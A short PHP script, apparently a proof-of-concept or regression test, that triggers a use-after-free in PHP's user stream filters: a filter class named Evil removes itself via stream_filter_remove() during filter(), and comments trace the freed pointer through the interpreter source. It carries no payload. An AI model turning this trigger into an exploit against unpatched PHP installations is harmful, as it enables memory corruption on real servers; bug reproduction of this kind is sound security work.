<?php
// A php_user_filter whose filter() removes its own filter via stream_filter_remove().
// php_stream_filter_remove() -> php_stream_filter_free(thisfilter) frees the filter
// while userfilter_filter (ext/standard/user_filters.c:211) is on the stack; on return
// it dereferences obj=&thisfilter->abstract (:240) and the stream read loop keeps using
// the freed filter. The NO_FCLOSE guard (:186) protects the stream, not the filter.
$GLOBALS['fres'] = null;
class Evil extends php_user_filter {
    public function filter($in, $out, &$consumed, $closing): int {
        while ($bucket = stream_bucket_make_writeable($in)) {
            $consumed += strlen($bucket->data);
            stream_bucket_append($out, $bucket);
        }
        if ($GLOBALS['fres'] !== null) {
            $r = $GLOBALS['fres'];
            $GLOBALS['fres'] = null;      // avoid re-entry during flush
            stream_filter_remove($r);     // frees $this's underlying filter
        }
        return PSFS_PASS_ON;
    }
}
stream_filter_register('evil', Evil::class);
$fp = fopen('php://memory', 'r+');
fwrite($fp, str_repeat('ABCD', 2000));
rewind($fp);
$GLOBALS['fres'] = stream_filter_append($fp, 'evil', STREAM_FILTER_READ);
$data = fread($fp, 65536);
var_dump(strlen($data));
echo "done\n";
